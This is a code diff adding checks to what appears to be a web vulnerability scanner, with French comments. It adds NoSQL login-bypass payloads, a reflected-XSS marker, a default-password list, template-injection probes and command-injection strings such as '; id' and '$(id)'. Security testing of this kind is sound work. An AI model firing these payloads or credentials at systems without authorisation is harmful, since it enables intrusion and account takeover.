@@ -262,8 +262,104 @@ def t_verbose_errors(http: Http) -> list[Finding]:
     return []
 
 
+def t_nosql_auth_bypass(http: Http) -> list[Finding]:
+    """Bypass d'authentification par opérateurs NoSQL (MongoDB)."""
+    payloads = [
+        {"email": {"$ne": None}, "password": {"$ne": None}},
+        {"email": {"$gt": ""}, "password": {"$gt": ""}},
+        {"username": {"$ne": None}, "password": {"$ne": None}},
+    ]
+    for ep in LOGIN_ENDPOINTS:
+        ref, _, _ = http.post(ep, data={"email": "nobody@nope.tld", "password": "x"})
+        if ref in (-1, 404):
+            continue
+        for pl in payloads:
+            st, _, body = http.post(ep, data=pl)
+            low = body.lower()
+            if st == 200 and ("token" in low or "authentication" in low or "jwt" in low):
+                return [Finding("nosql-injection-auth-bypass", "critical",
+                                http.base + ep,
+                                "Opérateur NoSQL ($ne/$gt) → authentification contournée")]
+    return []
+
+
+def t_reflected_xss(http: Http) -> list[Finding]:
+    """Réflexion non encodée d'un marqueur dans la réponse."""
+    marker = "pxss<script>t()</script>"
+    enc = urllib.parse.quote(marker)
+    endpoints = ["/", "/search", "/rest/products/search", "/api/search", "/index.html"]
+    params = ["q", "search", "query", "s", "name", "redirect"]
+    for ep in endpoints:
+        for p in params:
+            st, headers, body = http.get(f"{ep}?{p}={enc}")
+            ct = {k.lower(): v for k, v in headers.items()}.get("content-type", "")
+            if st == 200 and "html" in ct and "<script>t()</script>" in body:
+                return [Finding("reflected-xss", "high", f"{http.base}{ep}?{p}=",
+                                f"Marqueur réfléchi non encodé (param `{p}`)")]
+    return []
+
+
+DEFAULT_CREDS = [("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
+                 ("administrator", "administrator"), ("root", "root"),
+                 ("test", "test"), ("guest", "guest")]
+
+
+def t_default_credentials(http: Http) -> list[Finding]:
+    for ep in LOGIN_ENDPOINTS:
+        ref, _, _ = http.post(ep, data={"email": "nobody@nope.tld", "password": "x"})
+        if ref in (-1, 404):
+            continue
+        for user, pwd in DEFAULT_CREDS:
+            for uf in ("email", "username"):
+                st, _, body = http.post(ep, data={uf: user, "password": pwd})
+                low = body.lower()
+                if st == 200 and ("token" in low or "authentication" in low or "jwt" in low):
+                    return [Finding("default-credentials", "high", http.base + ep,
+                                    f"Identifiants faibles acceptés : {user}/{pwd}")]
+    return []
+
+
+def t_ssti(http: Http) -> list[Finding]:
+    """Server-Side Template Injection — évaluation d'une expression."""
+    probes = [("{{7*7}}", "49"), ("${7*7}", "49"), ("#{7*7}", "49"),
+              ("<%= 7*7 %>", "49")]
+    endpoints = ["/rest/products/search", "/search", "/api/search", "/"]
+    for ep in endpoints:
+        for expr, expect in probes:
+            st, _, body = http.get(f"{ep}?q={urllib.parse.quote(expr)}")
+            if st in (-1, 404) or _is_spa_shell(body):
+                continue
+            # Le contrôle négatif ne doit PAS produire le résultat : on exige
+            # que l'expression math soit évaluée alors que le littéral disparaît.
+            neg, _, nbody = http.get(f"{ep}?q={urllib.parse.quote('pz' + expr[2:])}")
+            if expect in body and expr not in body and expect not in (nbody or ""):
+                return [Finding("server-side-template-injection", "critical",
+                                f"{http.base}{ep}?q={expr}",
+                                f"Expression `{expr}` évaluée à `{expect}`")]
+    return []
+
+
+def t_command_injection(http: Http) -> list[Finding]:
+    marker = re.compile(r"uid=\d+\(.*gid=\d+\(")
+    for inj in ("; id", "| id", "`id`", "$(id)", "& id"):
+        for ep in ("/rest/products/search", "/search", "/api/ping", "/ping"):
+            st, _, body = http.get(f"{ep}?q={urllib.parse.quote('x' + inj)}")
+            if st in (-1, 404):
+                continue
+            if marker.search(body):
+                return [Finding("os-command-injection", "critical",
+                                f"{http.base}{ep}",
+                                f"Sortie de `id` observée (injection `{inj}`)")]
+    return []
+
+
 TECHNIQUES: list[tuple[str, Callable[[Http], list[Finding]]]] = [
     ("Sensitive file exposure", t_sensitive_files),
+    ("NoSQL auth bypass", t_nosql_auth_bypass),
+    ("Reflected XSS", t_reflected_xss),
+    ("Default credentials", t_default_credentials),
+    ("SSTI", t_ssti),
+    ("OS command injection", t_command_injection),
     ("SQLi auth bypass", t_sqli_auth_bypass),
     ("SQLi (error-based)", t_error_based_sqli),
     ("Path traversal / LFI", t_path_traversal),
